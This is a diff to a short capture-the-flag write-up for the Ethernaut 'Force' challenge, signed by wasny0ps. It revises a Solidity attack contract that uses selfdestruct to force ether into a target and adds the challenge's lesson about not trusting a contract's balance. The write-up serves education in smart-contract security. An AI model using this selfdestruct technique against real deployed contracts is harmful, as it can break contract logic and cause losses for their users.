@@ -33,15 +33,18 @@ My attack contract.
 ```solidity
 pragma solidity ^0.8.0;
 
+import './Force.sol';
+
 contract Attack{
 
-    address payable target;
+    Force force;
 
-    constructor(address payable _target){
-        target = _target;
+    constructor(address _target) {
+        force = Force(_target);
     }
 
-    function attack()public payable{
+    function attack() external payable{
+        address payable target = payable(address(force));
         selfdestruct(target);
     }
 }
@@ -69,5 +72,10 @@ Check instance's balance. Solved the challenge.
 await getBalance(instance)
 '0.00000000000000010'
 ```
+
+Ethernaut's message.
+
+>In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.
+However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
 
 **_by wasny0ps_**
